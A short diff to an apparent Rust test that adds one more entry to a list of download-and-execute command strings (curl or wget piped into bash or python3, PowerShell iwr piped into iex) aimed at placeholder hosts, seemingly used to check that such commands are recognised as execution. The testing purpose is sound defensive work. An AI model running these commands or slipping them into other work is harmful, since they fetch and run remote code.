@@ -213,6 +213,7 @@ fn rafix_exploit_requires_execution_not_data_processing() {
     }
     for cmd in [
         "sh -c 'curl -s http://198.51.100.7/x | bash'",
+        "sh -c 'curl -s http://198.51.100.7/x | bash -e'",
         "sh -c 'wget -qO- http://198.51.100.7/p.py | python3'",
         "powershell 'iwr http://198.51.100.7/a | iex'",
         "sh -c 'curl -s http://x.test/p | base64 -d | bash'",
